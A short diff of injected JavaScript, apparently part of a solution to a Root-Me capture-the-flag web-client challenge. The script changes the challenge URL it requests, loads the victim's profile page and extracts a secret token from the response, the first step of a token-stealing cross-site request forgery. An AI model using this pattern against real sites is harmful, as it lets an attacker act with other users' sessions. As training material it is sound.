@@ -1,7 +1,7 @@
 <script>
     function token1() {
         xmlHttp = new XMLHttpRequest();
-        xmlHttp.open("GET", decodeURIComponent("http://challenge01.root-me.org/web-client/ch23/index.php?action=profile"), false);
+        xmlHttp.open("GET", decodeURIComponent("http://challenge01.root-me.org:58003/profile"), false);
         xmlHttp.send(null); 
         var str1 = xmlHttp.responseText;
         var secret = extractSecret(str1);
